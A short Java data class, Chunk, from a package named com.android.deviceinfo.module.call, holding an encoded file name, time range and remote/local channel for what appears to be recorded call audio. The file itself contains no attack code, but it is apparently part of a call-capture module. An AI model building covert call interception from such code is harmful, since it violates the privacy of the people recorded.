package com.android.deviceinfo.module.call;

import java.util.Date;

import com.android.deviceinfo.auto.Cfg;
import com.android.deviceinfo.util.Check;

public class Chunk {
	private static final String TAG = "Chunk";
	
	public String encodedFile;
	public Date begin;
	public Date end;
	public boolean remote;
	public int channel;

	public Chunk(String encodedFile, Date begin, Date end, boolean remote) {
		this.encodedFile = encodedFile;
		this.begin = begin;
		this.end = end;
		this.remote = remote;
		this.channel = remote ? 0 : 1;
		
		if (Cfg.DEBUG) {
			Check.log(TAG + " (Chunk) date: " + begin);
		}
	}

}
